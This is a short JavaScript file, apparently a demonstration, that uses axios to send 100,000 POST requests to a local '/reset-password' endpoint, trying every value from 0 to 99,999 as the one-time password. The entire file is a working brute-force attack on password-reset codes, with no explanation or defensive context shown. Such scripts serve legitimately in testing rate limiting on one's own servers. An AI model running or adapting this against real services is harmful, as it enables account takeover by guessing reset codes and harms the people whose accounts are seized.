
import axios from 'axios';



for ( let i=0 ; i<100000; i++){
    axios.post("http://localhost:3000/reset-password", {
        otp:i 
    })
}